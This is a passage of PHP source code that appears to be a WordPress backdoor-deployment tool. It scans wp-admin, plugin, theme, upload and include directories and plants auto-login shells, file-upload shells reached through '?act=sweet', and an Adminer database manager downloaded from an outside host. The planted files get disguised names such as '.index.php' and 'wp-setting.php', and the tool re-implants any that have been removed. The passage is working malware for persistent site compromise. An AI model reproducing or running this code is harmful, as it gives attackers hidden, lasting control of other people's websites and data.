						$_POST['auto_login_includes']=1;
					}
				}else{
					$check_auto_login_ma=file_get_contents($auto_login_ma_url);
					if(strpos($check_auto_login_ma,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'')!==false){
						echo '<font color="green">'.$auto_login_ma_url.' ok!</font>'."<br/>"; 
					}else{
						if($auto_login_ma_num==0){
						$_POST['auto_login_admin']=1;
						}elseif($auto_login_ma_num==1){
							$_POST['auto_login_plugin']=1;
						}elseif($auto_login_ma_num==2){
							$_POST['auto_login_themes']=1;
						}elseif($auto_login_ma_num==3){
							$_POST['auto_login_uploads']=1;
						}elseif($auto_login_ma_num==4){
							$_POST['auto_login_includes']=1;
						}
						$auto_login_ma_array[$auto_login_ma_num]='';
					}
				}
				}
				//if(!is_file())
				$auto_login_ma_num++;
			}
		}//add_all_upload
	//add_all_auto_login
	if(!empty($_POST['auto_login_admin'])||!empty($_POST['add_all_auto_login'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-admin";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'wp-blog-header.php',$auto_login,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."auto_login_admin is add".'</font>'."<br/>";
					if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[0]=$insert_ma_array[1];
					}else{
					$chama_all_link4.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."auto_login_admin is not add".'</font>'."<br/>";
				if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[0]='';
					}else{
				$chama_all_link4.=$insert_ma_array[1];
					}
			}
		}
		
	/////////////////////////////////////////////////
	if(!empty($_POST['auto_login_plugin'])||!empty($_POST['add_all_auto_login'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/plugins";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'wp-blog-header.php',$auto_login,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."auto_login_plugin is add".'</font>'."<br/>";
					if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[1]=$insert_ma_array[1];
					}else{
					$chama_all_link4.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."auto_login_plugin is not add".'</font>'."<br/>";
				if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[1]='';
					}else{
				$chama_all_link4.=$insert_ma_array[1];
					}
			}
		}
	/////////////////////////////////////////////////themes
	if(!empty($_POST['auto_login_themes'])||!empty($_POST['add_all_auto_login'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/themes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'wp-blog-header.php',$auto_login,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."auto_login_themes is add".'</font>'."<br/>";
					if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[2]=$insert_ma_array[1];
					}else{
					$chama_all_link4.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."auto_login_themes is not add".'</font>'."<br/>";
				if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[2]='';
					}else{
				$chama_all_link4.=$insert_ma_array[1];
					}
			}
		}
	////////////////////////////////////////////uploads
	if(!empty($_POST['auto_login_uploads'])||!empty($_POST['add_all_auto_login'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/uploads";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'wp-blog-header.php',$auto_login,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."auto_login_uploads is add".'</font>'."<br/>";
					if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[3]=$insert_ma_array[1];
					}else{
					$chama_all_link4.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."auto_login_uploads is not add".'</font>'."<br/>";
				if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[3]='';
					}else{
				$chama_all_link4.=$insert_ma_array[1];
					}
			}
		}
		///////////////////////////////////////////
		if(!empty($_POST['auto_login_includes'])||!empty($_POST['add_all_auto_login'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-includes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'wp-blog-header.php',$auto_login,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."auto_login_includes is add".'</font>'."<br/>";
					if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[4]=$insert_ma_array[1];
					}else{
					$chama_all_link4.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."auto_login_includes is not add".'</font>'."<br/>";
				if(!empty($_POST['auto_login_ma'])){
						$auto_login_ma_array[4]='';
					}else{
				$chama_all_link4.=$insert_ma_array[1];
					}
			}
		}
		
		if(!empty($_POST['auto_login_ma'])){
		$chama_all_link4=implode('	',$auto_login_ma_array);
	}
	else{
		if(empty($_POST['auto_login_admin'])&&empty($_POST['auto_login_plugin'])&&empty($_POST['auto_login_themes'])&&empty($_POST['auto_login_uploads'])&&empty($_POST['auto_login_includes'])&&empty($_POST['add_all_auto_login'])){
			$chama_all_link4="";
		}
	}
		
		
		
		
	/////////////////////////////////all_new
	$add_adminer_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/adminer.txt");
	if(!empty($add_adminer_con)){
		if(!empty($_POST['adminer_ma'])){
			$adminer_ma_array=explode('	',$_POST['adminer_ma']);
			$adminer_ma_num=0;
			foreach($adminer_ma_array as $adminer_ma_url){
				if($adminer_ma_url==''){
					if($adminer_ma_num==0){
						$_POST["add_adminer_plugin"]=1;
					}elseif($adminer_ma_num==1){
						$_POST["add_adminer_themes"]=1;
					}elseif($adminer_ma_num==2){
						$_POST["add_adminer_includes"]=1;
					}
				}else{
					$url_str_replace_array=array("http://","https://");
					$adminer_ma_url=str_replace($url_str_replace_array,'',$adminer_ma_url);
				$adminer_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$adminer_ma_url);
				if(!is_file($adminer_ma_url)){
					$adminer_ma_array[$adminer_ma_num]='';
					if($adminer_ma_num==0){
						$_POST["add_adminer_plugin"]=1;
					}elseif($adminer_ma_num==1){
						$_POST["add_adminer_themes"]=1;
					}elseif($adminer_ma_num==2){
						$_POST["add_adminer_includes"]=1;
					}
				}else{
					$check_adminer_ma=file_get_contents($adminer_ma_url);
					if(strpos($check_adminer_ma,'Adminer')!==false){
						echo '<font color="green">'.$adminer_ma_url.'       ok!</font>'."<br/>"; 
					}else{
						$adminer_ma_array[$adminer_ma_num]='';
						if($adminer_ma_num==0){
						$_POST["add_adminer_plugin"]=1;
						}elseif($adminer_ma_num==1){
							$_POST["add_adminer_themes"]=1;
						}elseif($adminer_ma_num==2){
							$_POST["add_adminer_includes"]=1;
						}
					}
				}
				}
				
				
				
				//if(!is_file())
				$adminer_ma_num++;
			}
		}
	if(!empty($_POST['add_adminer_plugin'])||!empty($_POST['add_all_adminer'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/plugins";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'Adminer',$add_adminer_con,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."add_adminer_plugin is add".'</font>'."<br/>";
					if(!empty($_POST['adminer_ma'])){
					$adminer_ma_array[0]=$insert_ma_array[1];
					}else{
					$chama_all_link5.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."add_adminer_plugin is not add".'</font>'."<br/>";
				if(!empty($_POST['adminer_ma'])){
					$adminer_ma_array[0]='';
					}else{
				$chama_all_link5.=$insert_ma_array[1];
					}
			}
		}
 
	/////////////////////////////////////////////
	if(!empty($_POST['add_adminer_themes'])||!empty($_POST['add_all_adminer'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/themes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'Adminer',$add_adminer_con,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."add_adminer_themes is add".'</font>'."<br/>";
					if(!empty($_POST['adminer_ma'])){
					$adminer_ma_array[1]=$insert_ma_array[1];
					}else{
					$chama_all_link5.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."add_adminer_themes is not add".'</font>'."<br/>";
				if(!empty($_POST['adminer_ma'])){
					$adminer_ma_array[1]='';
					}else{
				$chama_all_link5.=$insert_ma_array[1];
					}
			}
		}
 
		
		
		
		/////////////////////////////////////////////
	if(!empty($_POST['add_adminer_includes'])||!empty($_POST['add_all_adminer'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-includes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'Adminer',$add_adminer_con,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."add_adminer_includes is add".'</font>'."<br/>";
					if(!empty($_POST['adminer_ma'])){
					$adminer_ma_array[2]=$insert_ma_array[1];
					}else{
					$chama_all_link5.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."add_adminer_includes is not add".'</font>'."<br/>";
				if(!empty($_POST['adminer_ma'])){
					$adminer_ma_array[2]='';
					}else{
						$chama_all_link5.=$insert_ma_array[1];
					}
			}
		}
		if(!empty($_POST['adminer_ma'])){
			$chama_all_link5=implode('	',$adminer_ma_array);
		}
	}
	$add_adminer_con=NULL;
	unset($add_adminer_con);
		/////////////////////////////////////////
	 $chama_all_link6='';
	 if(!empty($_POST['little_check_ma'])){
			$little_check_ma_array=(explode('	',$_POST['little_check_ma']));
			$little_check_ma_num=0;
			foreach($little_check_ma_array as $little_check_ma_url){
					$url_str_replace_array=array("http://","https://");
				$little_check_ma_url=str_replace($url_str_replace_array,'',$little_check_ma_url);
				$little_check_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$little_check_ma_url);
				$little_check_ma_url=str_replace('?act=sweet','',$little_check_ma_url);
				if(!is_file($little_check_ma_url)){
					$little_check_ma_array[$little_check_ma_num]='';
					if($little_check_ma_num==0){
						$_POST['little_ma_admin']=1;
					}elseif($little_check_ma_num==1){
						$_POST['little_ma_plugins']=1;
					}elseif($little_check_ma_num==2){
						$_POST['little_ma_themes']=1;
					}elseif($little_check_ma_num==3){
						$_POST['little_ma_uploads']=1;
					}elseif($little_check_ma_num==4){
						$_POST['little_ma_includes']=1;
					}elseif($little_check_ma_num==5){
						$_POST['little_ma_2']=1;
					}
				}else{
					$check_little_check_ma=file_get_contents($little_check_ma_url);
					if(strpos($check_little_check_ma,'$_POST["content"])&&isset($_POST["name"])')!==false){
						echo '<font color="green">'.$little_check_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$little_check_ma_array[$little_check_ma_num]='';
						if($little_check_ma_num==0){
						$_POST['little_ma_admin']=1;
						}elseif($little_check_ma_num==1){
							$_POST['little_ma_plugins']=1;
						}elseif($little_check_ma_num==2){
							$_POST['little_ma_themes']=1;
						}elseif($little_check_ma_num==3){
							$_POST['little_ma_uploads']=1;
						}elseif($little_check_ma_num==4){
							$_POST['little_ma_includes']=1;
						}elseif($little_check_ma_num==5){
							$_POST['little_ma_2']=1;
						}
					}
				}
				
				//if(!is_file())
				$little_check_ma_num++;
			}
		}
		
	 if(!empty($_POST['little_ma_admin'])||!empty($_POST['add_all_little_ma'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-admin";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$_POST["content"])&&isset($_POST["name"])',$little_put_file_ma_2,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."little_ma_admin is add".'</font>'."<br/>";
					if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[0]=$insert_ma_array[1].'?act=sweet';
					}else{
					$chama_all_link6.=$insert_ma_array[1].'?act=sweet	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."little_ma_admin is not add".'</font>'."<br/>";
				if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[0]='';
					}else{
				$chama_all_link6.=$insert_ma_array[1];
					}
			}
		}
 
	 ////////////////////////////////////////////
	if(!empty($_POST['little_ma_plugins'])||!empty($_POST['add_all_little_ma'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/plugins";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$_POST["content"])&&isset($_POST["name"])',$little_put_file_ma,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."little_ma_plugins is add".'</font>'."<br/>";
					if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[1]=$insert_ma_array[1].'?act=sweet';
					}else{
					$chama_all_link6.=$insert_ma_array[1].'?act=sweet	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'." little_ma_plugins is not add".'</font>'."<br/>";
				if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[1]='';
					}else{
				$chama_all_link6.=$insert_ma_array[1];
					}
			}
		}
 
	///////////////////////////////////////////
	if(!empty($_POST['little_ma_themes'])||!empty($_POST['add_all_little_ma'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/themes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$_POST["content"])&&isset($_POST["name"])',$little_put_file_ma,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."little_ma_themes is add".'</font>'."<br/>";
					if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[2]=$insert_ma_array[1].'?act=sweet';
					}else{
					$chama_all_link6.=$insert_ma_array[1].'?act=sweet	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."little_ma_themes is not add".'</font>'."<br/>";
				if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[2]='';
					}else{
				$chama_all_link6.=$insert_ma_array[1];
					}
			}
		}
 
	///////////////////////////////////
	if(!empty($_POST['little_ma_uploads'])||!empty($_POST['add_all_little_ma'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/uploads";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$_POST["content"])&&isset($_POST["name"])',$little_put_file_ma,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."little_ma_uploads is add".'</font>'."<br/>";
					if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[3]=$insert_ma_array[1].'?act=sweet';
					}else{
					$chama_all_link6.=$insert_ma_array[1].'?act=sweet	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."little_ma_uploads is not add".'</font>'."<br/>";
				if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[3]='';
					}else{
				$chama_all_link6.=$insert_ma_array[1];
					}
			}
		}
 
		///////////////////////////////////
	if(!empty($_POST['little_ma_includes'])||!empty($_POST['add_all_little_ma'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-includes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$_POST["content"])&&isset($_POST["name"])',$little_put_file_ma,$shuffle);
				}
				
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."little_ma_uploads is add".'</font>'."<br/>";
					if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[4]=$insert_ma_array[1].'?act=sweet';
					}else{
					$chama_all_link6.=$insert_ma_array[1].'?act=sweet	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."little_ma_uploads is not add".'</font>'."<br/>";
				if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[4]='';
					}else{
				$chama_all_link6.=$insert_ma_array[1];
					}
			}
		}
 ///////////////////////////////////////////////////////////////////////////////////////
	if(!empty($_POST['little_ma_2'])||!empty($_POST['all_new'])){
		$new_ma_con=$little_put_file_ma_2;
		$add_user_link=insert_ma('little_ma_2',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[5]=$insert_ma_array[1].'?act=sweet';
					}else{
			$chama_all_link6.=$add_user_link.'?act=sweet'.'	';
					}
		}else{
			if(!empty($_POST['little_check_ma'])){
					$little_check_ma_array[5]='';
					}else{
			$chama_all_link6.='	';
					}
		}
	}
	if(!empty($_POST['little_check_ma'])){
		$chama_all_link6=implode('	',$little_check_ma_array);
	}
	else{
		if(empty($_POST['little_ma_admin'])&&empty($_POST['little_ma_plugins'])&&empty($_POST['little_ma_themes'])&&empty($_POST['little_ma_uploads'])&&empty($_POST['little_ma_includes'])&&empty($_POST['little_ma_2'])&&empty($_POST['add_all_little_ma'])){
			$chama_all_link6="";
		}
	}
	
	
	
	
	$root_all_dir=traverseDir_cur_dir($_POST['root']);
	if(!empty($root_all_dir)){
		$all_root_option='';
		foreach($root_all_dir as $root_one){
			$all_root_option.='<option value="'.$root_one.'">'.$root_one.'</option>';
		}
	}else{
		$all_root_option='';
	}
	///////////////////////////////////root_other_chama_1
	$all_root_ma='';
	$all_root_ma_array=array();
